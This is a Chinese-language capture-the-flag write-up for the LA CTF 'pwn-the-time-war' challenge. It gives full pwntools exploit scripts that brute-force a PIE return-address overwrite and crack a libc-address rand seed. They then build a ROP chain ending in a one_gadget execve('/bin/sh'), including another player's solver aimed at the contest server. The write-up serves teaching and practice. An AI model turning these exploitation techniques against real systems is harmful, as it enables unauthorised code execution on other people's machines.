---
title: lactf - pwn-the-time-war
categories: [ctf2026, lactf]
tags: [pwn, ROP]
---
这一题是赛后做出来的（而且一开始没注意到srand的种子是clock_gettime的地址，感觉无从下手）。感觉比前面的tcademy和adventure都简单，但是比赛过程中这一题解出的人反而比较少，应该这一题需要大量枚举，打远程环境网络不好太折磨了。

### 0x01 寻找溢出
很容易发现run()中能够修改两个地址的2字节：
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init();
  run();
  return 0;
}
```
```c
void init()
{
  setbuf(stdout, 0);
  srand((unsigned int)&clock_gettime);
}
```
```c
int run()
{
  int result; // eax
  __int16 v1; // [rsp+Ch] [rbp-14h] BYREF
  __int16 v2; // [rsp+Eh] [rbp-12h] BYREF
  __int16 v3; // [rsp+10h] [rbp-10h] BYREF
  __int16 v4; // [rsp+12h] [rbp-Eh] BYREF
  _WORD v5[4]; // [rsp+14h] [rbp-Ch]
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i <= 3; ++i )
    v5[i] = rand() % 16;
  printf("You see a locked box. The dial on the lock reads: %d-%d-%d-%d\n", v5[0], v5[1], v5[2], v5[3]);
  printf("Which dial do you want to turn? ");
  result = __isoc99_scanf("%hd", &v4);
  if ( result > 0 )
  {
    printf("What do you want to set it to? ");
    __isoc99_scanf("%hd", &v3);
    printf("Second dial to turn? ");
    __isoc99_scanf("%hd", &v2);
    printf("What do you want to set it to? ");
    __isoc99_scanf("%hd", &v1);
    v5[v4] = v3;
    v5[v2] = v1;
    return puts("The box remains locked.");
  }
  return result;
}
```
这一题有PIE, 但是目前没有方法泄露基地址。但是我们可以尝试修改返回地址的低位2字节，而其末3位是不受PIE影响的，所以我们可以猜剩余的数字，有1/16的概率能成功劫持控制流。

经过计算v5[10]就是ret-addr的低位字节（验证：修改offset=9还正常，但是到offset=10就开始segmentation fault）

能够劫持控制流后，首先想到的就是：可以再次返回run函数处。刚开始我计划的是返回run函数内部的0x11B2位置：
```
.text:00000000000011B2 ; __unwind {
.text:00000000000011B2                 push    rbp
.text:00000000000011B3                 mov     rbp, rsp
.text:00000000000011B6                 sub     rsp, 20h
.text:00000000000011BA                 mov     [rbp+var_4], 0
.text:00000000000011C1                 jmp     short loc_11EB
```
尝试运行脚本：
```python
from pwn import *
import time

def enter_number(io, a, b, c, d):
    io.recvuntil(b'Which dial do you want to turn? ')
    io.sendline(str(a).encode())
    io.recvuntil(b'What do you want to set it to? ')
    io.sendline(str(b).encode())
    io.recvuntil(b'Second dial to turn? ')
    io.sendline(str(c).encode())
    io.recvuntil(b'What do you want to set it to? ')
    io.sendline(str(d).encode())
    time.sleep(0.5)
    status = io.poll(block=False)
    if status is None:
        return True
    else:
        return False

context.binary = './pwn_the_time_war'

# The saved RIP after `call run` is base + 0x1334.
# The target `run` entry is base + 0x11b2.
# Since PIE randomizes bits 12..15 of the low 16 bits, we need to try 0x?1b2.
for attempt in range(256):
    overwrite = ((attempt % 16) << 12) | 0x1B2
    print(f'attempt={attempt} overwrite={overwrite:#06x}')
    io = process(context.binary.path)
    try:
        ret = enter_number(io, 10, overwrite, 1, 2)
        if ret:
            io.interactive()
            break
    finally:
        if io.poll(block=False) is not None:
            io.close()
```
其中`status = io.poll(block=False)`可以检测程序的状态，如何还在运行，等于None。
但是执行的过程中，似乎一直在崩溃，非常奇怪。

用gdb调试，修改ret addr指向0x11B2位置，还是报错，突然想到：或许是rsp没有0x10对齐的原因！

> 在调用某些系统函数前，需要满足rsp 0x10对齐， 函数调用的过程中会一直保持这个条件：call之前平衡； call时压入ret地址，但是随后push rbp又平衡； sub rsp xxx平衡，然后到了一个新的函数内部，仍然保持平衡。
{: .prompt-info }

### 0x02 leak
刚开始我没有注意到srand的种子问题，于是绞尽脑汁开始尝试一些野路子。我的计划是：先泄露PIE，这个信息存在于栈上，所以只要找到一个能够读取+显示栈上数值的逻辑片段，就有机会。
其中
```c
printf("You see a locked box. The dial on the lock reads: %d-%d-%d-%d\n", v5[0], v5[1], v5[2], v5[3]);
```
输出了栈上的值，而对于栈上的引用是通过rbp实现的，或许可以通过一些构造，让rbp指向特定的位置？
但是尝试了后，失败。

开始看提示，发现有libc地址作为种子，那么接下来就很明确了，开始通过多次leak dial number来爆破。

但是一次性爆破4字节还是太慢了（Dockerfile中指定远程环境有180秒连接时间限制）.改进：假设libc，然后确定clock_gettime地址的末3位数字，可以把时间缩短到原来的1/64. 不过由于在本地练习，我直接用了libc 2.35
```python
from socket import timeout
from pwn import *
from ctypes import CDLL, c_uint
import time

dial_list = []

def parse_dial(io):
    x = io.recvline().decode()
    print(x)
    y = x.split()[-1].split('-')
    dial_list.extend(y)

def enter_number(io, a, b, c, d, wait=False):
    parse_dial(io)
    io.recvuntil(b'Which dial do you want to turn? ')
    io.sendline(str(a).encode())
    io.recvuntil(b'What do you want to set it to? ')
    io.sendline(str(b).encode())
    io.recvuntil(b'Second dial to turn? ')
    io.sendline(str(c).encode())
    io.recvuntil(b'What do you want to set it to? ')
    io.sendline(str(d).encode())
    if wait:
        time.sleep(0.2)
    status = io.poll(block=False)
    if status is None:
        return True
    else:
        return False

for i in range(20):
    dial_list = []
    print(i)
    io = process('./pwn_the_time_war')
    # ret = enter_number(io, 10, 0x132F, 1, 2)
    ret = enter_number(io, 10, 0x132F, 1, 2, True)
    if ret:
        io.recvline()
        for j in range(30):
            print(j)
            enter_number(io, 10, 0x132F, 1, 2)
            io.recvline()
        print(dial_list)
        break
 
libc_elf = ELF('./lib/libc.so.6')
clock_gettime = libc_elf.symbols['clock_gettime']

# crack the seed
# libc没有必要用配套的版本，直接用系统的
# 如果CDLL的参数和运行python用的libc(系统libc)不一致，会报错
libc = CDLL("/usr/lib/libc.so.6")

max_match = 0
for i in range(0, 0xFFFFF+1):
    seed = (i<<12) | 0x650
    libc.srand(seed)
    print(f'Testing {hex(seed)}')

    hit = True
    cnt = 0
    for item in dial_list:
        lhs = libc.rand() % 16
        rhs = item
        print(f'\t {lhs} ~ {rhs}')
        print(lhs != rhs)
        if lhs != rhs:
            hit = False
            break
        else:
            cnt+=1
    if cnt > max_match:
        max_match = cnt

    if hit:
        print(f'{hex(seed)}')
        break
print(hex(clock_gettime))       # least-bytes: 0x650
print(max_match)
```
通过足够次数的dial number泄露，然后调用libc中的srand / rand函数。
> python中调用libc函数，可以使用CDLL的方式。但是注意：python运行的libc版本和调用的目标libc版本应该匹配，否则会报错：
>
>```
>Traceback (most recent call last):  
> File "/ctf/lactf/pwn_the_time_war/crack.py", line 52, in <module>  
>   libc = CDLL("./lib/libc.so.6")  
> File "/home/woc/.local/share/uv/python/cpython-3.14.0-linux-x86_64-gnu/lib/python3.14/>ctypes/__init__.py", line 462, in __init__  
>   self._handle = _dlopen(self._name, mode)  
>                  ~~~~~~~^^^^^^^^^^^^^^^^^^  
>OSError: ./lib/libc.so.6: undefined symbol: __nptl_change_stack_perm, version GLIBC_PRIVATE
>```
>这里我们只需要用libc模拟rand操作，和libc版本无关，所以这里直接用系统的libc
{: .prompt-warning }


但是奇怪的是还是跑不出来，而且出现了非常奇怪的现象：
先是发现没有结果 -> 输出max_cnt，为0； 接着再输出lhs, rhs, 发现即使相等也会判定 `!=`
后来发现dial_list里是字符串，气笑了

修掉这个bug后，我们能够确定clock_gettime的实际地址为：0x00007f??{xxxxxxxx}，但是其中还是有一个字节无法确定，需要我们猜测，又有1/256的概率.

### 0x03 one-gadget
寻找one-gadget:
```
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebce2 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp
......
```
因为爆破速度比较慢，所以计划先在调试中试验这些gadget,等通过了再测试.

这里写了一个gdb脚本来辅助修改，可以通过计算来直接获得libc真实地址，然后在ret前，修改$rsp位置的值.
```python
from pwn import *
import gdb
gdb.execute("b *(&run+0x169)")  # stop at ret
# gdb.execute("b *(&main+0x1e)")  # stop at ret
gdb.execute("run")

libc = ELF('./lib/libc.so.6')
printf_offset = libc.symbols['printf']
printf_addr = int(gdb.parse_and_eval("(void *)printf"))
libc_base = printf_addr - printf_offset

print(f'libc_base: {hex(libc_base)}')
gadget_addr = int(input('One_gadget_addr: '), 16)
gadget_addr += libc_base

fake_rbp = libc_base + 0x21b000
gdb.execute(f'set *(long long *)$rsp = {hex(gadget_addr)}')
gdb.execute(f'set $rbp = {hex(fake_rbp)}')
# gdb.execute('c')
```
> 修改rsp指针本身的值： set $rsp=1
>
> 修改rsp指向的值，需要将其解释为某个指针，然后解引用：set *(long long *)$rsp = 1
{: .prompt-tip }

刚开始我修改的是run函数的返回地址。当gdb中尝试到0xebce2的时候，显示gdb因为执行别的程序而将其kill掉。似乎成功了。
但是实际跑的时候突然想到：如果覆盖run的返回地址，一次性只能修改4字节！所以还是修改main函数返回地址比较好，可以分多次写入。

然而遗憾的是：在main函数中执行所有的one-gadget，都会遇到问题。
但是理论上从run返回到main返回，寄存器环境应该没有什么变化才对，为什么会执行失败呢？
再次修改main的返回地址，指向`0xebce2`这个gadget，调试进入execve：
![](/assets/ctf/2026/pwn_the_time_war_onegadget_debug.png)
问题出在rbp地址解引用非法，再看one-gadget的要求：
```
  address rbp-0x48 is writable
```
这就是原因！直接修改run的返回地址时，rbp指向的是栈空间，可以读写；但是从main函数返回前，会执行pop rbp,这会导致rbp指向一个别的值！（调试发现这个值似乎是0）

思路1: 能否先将main返回地址修改成调用run函数，然后这样再返回的时候，寄存器环境就和自己模拟的run后面比较像了 （但是突然想到：自己连完整的PIE都没有泄露!）
思路2: 这个pop出的rbp是我们能够控制的，我们要将它指向一个可以写的空间。

但是我们目前只泄露（准确来说，是猜测）了libc, 突然想到：或许libc中也有可以w的段呢？
用vmmap查看，发现果然libc + 21a000开始就是一个可以写的段，长度有0x2000.
为了保险起见，选择将rbp地址覆盖成libc + 21b000.

```
from contextlib import contextmanager
from socket import timeout
from pwn import *
from ctypes import CDLL, c_uint
import time

dial_list = []
context.terminal = ['tmux', 'split', '-v']

def parse_dial(io):
    x = io.recvline().decode()
    if 'remain' in x:
        x = io.recvline().decode()  # 暴力解决
    print(x)
    y = [int(i) for i in x.split()[-1].split('-')]
    # y = list(map(int ,x.split()[-1].split('-')))
    dial_list.extend(y)


def enter_number(io, a, b, c, d, wait=False):
    parse_dial(io)
    io.recvuntil(b'Which dial do you want to turn? ')
    io.sendline(str(a).encode())
    io.recvuntil(b'What do you want to set it to? ')
    io.sendline(str(b).encode())
    io.recvuntil(b'Second dial to turn? ')
    io.sendline(str(c).encode())
    io.recvuntil(b'What do you want to set it to? ')
    io.sendline(str(d).encode())
    if wait:
        time.sleep(0.2)
    status = io.poll(block=False)
    if status is None:
        return True
    else:
        return False

io = 0
for i in range(100):
    dial_list = []
    print(i)

    io = process('./pwn_the_time_war')
    # ret = enter_number(io, 10, 0x132F, 1, 2)
    ret = enter_number(io, 10, 0x132F, 1, 2, True)
    if ret:
        io.recvline()
        for j in range(30):
            print(j)
            enter_number(io, 10, 0x132F, 1, 2)
            io.recvline()
        print(dial_list)
        break

            
libc_elf = ELF('./lib/libc.so.6')
clock_gettime = libc_elf.symbols['clock_gettime']

# crack the seed
# libc没有必要用配套的版本，直接用系统的
# 如果CDLL的参数和运行python用的libc(系统libc)不一致，会报错
libc = CDLL("/usr/lib/libc.so.6")
libc.srand.argtypes = [c_uint]
libc.srand.restype = None
libc.rand.restype = c_uint

max_match = 0
seed = 0
for i in range(0, 0xFFFFF+1):
    seed = (i<<12) | 0x650
    libc.srand(seed)
    # print(f'Testing {hex(seed)}')

    hit = True
    cnt = 0
    for item in dial_list:
        lhs = libc.rand() % 16
        rhs = item
        # print(f'\t {lhs} ~ {rhs}')
        # print(lhs != rhs)
        if lhs != rhs:
            hit = False
            break
        else:
            cnt+=1
    if cnt > max_match:
        max_match = cnt

    if hit:
        print(f'seed: {hex(seed)}')
        break
print(f'seed: {hex(seed)}')
print(f'clock_gettime offset:{hex(clock_gettime)}')       # least-bytes: 0x650
# print(max_match)

guess_byte = 0x30    # 1/256

guess_gettime_addr = (0x7f30<<32) | seed
guess_libc = guess_gettime_addr - clock_gettime

one_gadget_addr = guess_libc + 0xebce2

gdb_script = """
init-gef
b *(&run+0x169)
b *(&main+0x1d)
"""

maps = io.libs()
real_libc = maps['/ctf/lactf/pwn_the_time_war/lib/libc.so.6']
print(f'Real libc:{hex(real_libc)}')
print(f'Guess libc:{hex(guess_libc)}')
if real_libc == guess_libc:
    input('press to continue')
    gdb.attach(io, gdbscript=gdb_script)


enter_number(io, 10, 0x132F, 18, one_gadget_addr & 0xFFFF)
enter_number(io, 10, 0x132F, 19, (one_gadget_addr>> 16) & 0xFFFF)
enter_number(io, 10, 0x132F, 20, (one_gadget_addr>> 32) & 0xFFFF)
enter_number(io, 10, 0x132F, 21, (one_gadget_addr>> 48) & 0xFFFF)

print('--------1---------')
simu_rbp = guess_libc + 0x21b000
enter_number(io, 10, 0x132F, 14, guess_libc & 0xFFFF)
enter_number(io, 10, 0x132F, 15, (guess_libc>> 16) & 0xFFFF)
enter_number(io, 10, 0x132F, 16, (guess_libc>> 32) & 0xFFFF)
enter_number(io, 10, 0x132F, 17, (guess_libc>> 48) & 0xFFFF)

print('--------2---------')
# enter_number(io, 1,1,1,1)
io.interactive()

time.sleep(0.2)
status = io.poll(block=False)
if status is None:
    print('good')
else:
    exit(-1)
```
但是还是没有成功！调试的时候发现根本没有命中 main+0x1d处的断点，继续检查发现：最后一次run返回的地址并不是main函数，而是一个非法的乱数据。原因是自己第一次ret到 call run的地方已经消耗了这个地址，后续一直都是“平衡”. 自己为了偷懒，最后一轮run输入的全是1。
所以我们最后一轮还需要再加上一轮构造，回到main结尾，执行leave-ret. 这个很容易实现。

> rop的过程中要关注数据的“平衡！”
{: .prompt-warning }


接着执行，调试的时候确实出现了和刚开始调试一样的"执行别的程序，然后kill"的情况，但是实际打的时候，又会提示出现：
```
The box remains locked.
/bin/sh: UH\x89\xe5\xb8: No such file or directory
```
或许是没有满足one-gadget的其余几个条件？

> 在gdb调试的时候，execve执行进程然后被kill并不能完全开香槟！
{: .prompt-warning }

剩下的条件是：
```
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp
```
显然最容易控制的就算r12和r13.
既然我们已经泄露了libc地址，那么gadget自然是要多少有多少.
将main的返回地址修改成pop-r12-r13 gadget地址，然后继续往后写rop链:
```python
from contextlib import contextmanager
from socket import timeout
from pwn import *
from ctypes import CDLL, c_uint
import time

dial_list = []
context.terminal = ['tmux', 'split', '-v']

def parse_dial(io):
    x = io.recvline().decode()
    if 'remain' in x:
        x = io.recvline().decode()  # 暴力解决
    print(x)
    y = [int(i) for i in x.split()[-1].split('-')]
    # y = list(map(int ,x.split()[-1].split('-')))
    dial_list.extend(y)


def enter_number(io, a, b, c, d, wait=False):
    parse_dial(io)
    io.recvuntil(b'Which dial do you want to turn? ')
    io.sendline(str(a).encode())
    io.recvuntil(b'What do you want to set it to? ')
    io.sendline(str(b).encode())
    io.recvuntil(b'Second dial to turn? ')
    io.sendline(str(c).encode())
    io.recvuntil(b'What do you want to set it to? ')
    io.sendline(str(d).encode())
    if wait:
        time.sleep(0.1)
    status = io.poll(block=False)
    if status is None:
        return True
    else:
        return False

io = 0
for i in range(100):
    dial_list = []
    print(i)

    io = process('./pwn_the_time_war')
    # ret = enter_number(io, 10, 0x132F, 1, 2)
    ret = enter_number(io, 10, 0x132F, 1, 2, True)
    if ret:
        io.recvline()
        for j in range(30):
            print(j)
            enter_number(io, 10, 0x132F, 1, 2)
            io.recvline()
        print(dial_list)
        break

            
libc_elf = ELF('./lib/libc.so.6')
clock_gettime = libc_elf.symbols['clock_gettime']

# crack the seed
# libc没有必要用配套的版本，直接用系统的
# 如果CDLL的参数和运行python用的libc(系统libc)不一致，会报错
libc = CDLL("/usr/lib/libc.so.6")
libc.srand.argtypes = [c_uint]
libc.srand.restype = None
libc.rand.restype = c_uint

max_match = 0
seed = 0
for i in range(0, 0xFFFFF+1):
    seed = (i<<12) | 0x650
    libc.srand(seed)
    # print(f'Testing {hex(seed)}')

    hit = True
    cnt = 0
    for item in dial_list:
        lhs = libc.rand() % 16
        rhs = item
        # print(f'\t {lhs} ~ {rhs}')
        # print(lhs != rhs)
        if lhs != rhs:
            hit = False
            break
        else:
            cnt+=1
    if cnt > max_match:
        max_match = cnt

    if hit:
        print(f'seed: {hex(seed)}')
        break
print(f'seed: {hex(seed)}')
print(f'clock_gettime offset:{hex(clock_gettime)}')       # least-bytes: 0x650
# print(max_match)

maps = io.libs()
real_libc = maps['/ctf/lactf/pwn_the_time_war/lib/libc.so.6']


guess_byte = 0x30    # 1/256

guess_gettime_addr = (0x7f30<<32) | seed
guess_libc = guess_gettime_addr - clock_gettime

# NOTE: just for debug
# guess_libc = real_libc

one_gadget_addr = guess_libc + 0xebce2

gdb_script = """
init-gef
b *(&run+0x169)
b *(&main+0x1d)
"""

print(f'Real libc:{hex(real_libc)}')
print(f'Guess libc:{hex(guess_libc)}')
if real_libc == guess_libc:
    input('press to continue')
    # gdb.attach(io, gdbscript=gdb_script)

pop_r12_r13_addr = guess_libc + 0x41c48

enter_number(io, 10, 0x132F, 18, pop_r12_r13_addr & 0xFFFF)
enter_number(io, 10, 0x132F, 19, (pop_r12_r13_addr>> 16) & 0xFFFF)
enter_number(io, 10, 0x132F, 20, (pop_r12_r13_addr>> 32) & 0xFFFF)
enter_number(io, 10, 0x132F, 21, (pop_r12_r13_addr>> 48) & 0xFFFF)

enter_number(io, 10, 0x132F, 22, 0)
enter_number(io, 10, 0x132F, 23, 0)
enter_number(io, 10, 0x132F, 24, 0)
enter_number(io, 10, 0x132F, 25, 0)

enter_number(io, 10, 0x132F, 26, 0)
enter_number(io, 10, 0x132F, 27, 0)
enter_number(io, 10, 0x132F, 28, 0)
enter_number(io, 10, 0x132F, 29, 0)

enter_number(io, 10, 0x132F, 30, one_gadget_addr & 0xFFFF)
enter_number(io, 10, 0x132F, 31, (one_gadget_addr>> 16) & 0xFFFF)
enter_number(io, 10, 0x132F, 32, (one_gadget_addr>> 32) & 0xFFFF)
enter_number(io, 10, 0x132F, 33, (one_gadget_addr>> 48) & 0xFFFF)

print('--------1---------')
# simu_rbp = guess_libc + 0x21b000
simu_rbp = guess_libc + 0x21b200
enter_number(io, 10, 0x132F, 14, simu_rbp & 0xFFFF)
enter_number(io, 10, 0x132F, 15, (simu_rbp>> 16) & 0xFFFF)
enter_number(io, 10, 0x132F, 16, (simu_rbp>> 32) & 0xFFFF)
enter_number(io, 10, 0x132F, 17, (simu_rbp>> 48) & 0xFFFF)

print('--------2---------')
enter_number(io, 10, 0x1339, 1, 1)

if real_libc == guess_libc:
    io.interactive()

time.sleep(0.2)
status = io.poll(block=False)
if status is None:
    print('good')
else:
    exit(-1)
```

写brute.py挂机跑：
```python
import subprocess

while True:
    counter = 0
    print(f'Trying {counter}...')
    result = subprocess.run(["python", "crack.py"])
    print(f'Return {result.returncode}')

    counter += 1
    if result.returncode != 255:
        print("good")
```
最后成功获得shell.

附上别人@`nirvanaK`的解法：
```python
#!/usr/bin/env python3

from time import clock_gettime
from pwn import *
import ctypes, ctypes.util

exe = ELF("pwn_the_time_war_patched")
libc = ELF("shared/libc.so.6")
ld = ELF("shared/ld-linux-x86-64.so.2")

context.binary = exe

libc_exec = ctypes.CDLL(ctypes.util.find_library("c"))
libc_exec.srand.argtypes = [ctypes.c_uint]
libc_exec.rand.restype   = ctypes.c_int

def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path])
    else:
        r = remote("chall.lac.tf", 31313)

    return r


def leak_some_libc(leak_rand):
    known = 0x420
    potential = list()
    for i in range(0x100000, 0, -1):
        found = True
        int_clock_gettime = (i << 12) | known
        libc_exec.srand(int_clock_gettime)

        for random in leak_rand:
            if random != (libc_exec.rand() % 16):
                found = False
                break

        if found:
            potential.append(int_clock_gettime)


    return potential

def main():
    while True:
        io = conn()
        if args.GDB:
            io.recvline()
        leak_rand_1 = io.recvline().split(b": ")[1].strip().split(b"-")
        leak_rand_1 = list(map(int, leak_rand_1))
        log.info(f"clock_gettime {libc.sym['clock_gettime']:#x}")
        print(leak_rand_1)

        if args.GDB:
            hope_run = int(input("hope run: "), 16)
            pause()
        else:
            hope_run = 0x532f


        io.sendlineafter(b"Which dial do you want to turn? ", str(10).encode())
        io.sendlineafter(b"What do you want to set it to? ", str(hope_run).encode())
        io.sendlineafter(b"Second dial to turn? ", str(18).encode())
        io.sendlineafter(b"What do you want to set it to? ", str(0xdeadbeef).encode())

        io.recvline()

        try:
            leak_rand_2 = io.recvline().split(b": ")[1].strip().split(b"-")
        except:
            io.close()
            continue
        leak_rand_2 = list(map(int, leak_rand_2))
        print(leak_rand_2)

        int_clock_gettime = leak_some_libc(leak_rand_1 + leak_rand_2)
        print(int_clock_gettime)
        int_clock_gettime = int_clock_gettime[0]

        log.info(f"int clock_gettime {int_clock_gettime:#x}")

        # one = int_clock_gettime + 0x5d3f
        one = int_clock_gettime - 0x832e7
        # one = int_clock_gettime - 0x832e0
        add_rsp_ret = hope_run - 0x31d
        io.sendlineafter(b"Which dial do you want to turn? ", str(18).encode())
        io.sendlineafter("What do you want to set it to? ", str(one & 0xffff).encode())
        io.sendlineafter(b"Second dial to turn? ", str(10).encode())
        io.sendlineafter("What do you want to set it to? ", str(hope_run).encode())



        io.sendlineafter(b"Which dial do you want to turn? ", str(19).encode())
        io.sendlineafter("What do you want to set it to? ", str((one & ~0xffff)>>16).encode())
        # io.sendlineafter(b"Second dial to turn? ", str(10).encode())
        io.sendlineafter(b"Second dial to turn? ", str(10).encode())
        io.sendlineafter("What do you want to set it to? ", str(hope_run).encode())

        io.sendlineafter(b"Which dial do you want to turn? ", str(0x9a).encode())
        io.sendlineafter("What do you want to set it to? ", str(0).encode())
        io.sendlineafter(b"Second dial to turn? ", str(0).encode())
        io.sendlineafter("What do you want to set it to? ", str(hope_run).encode())



 
        io.interactive()



if __name__ == "__main__":
    main()
```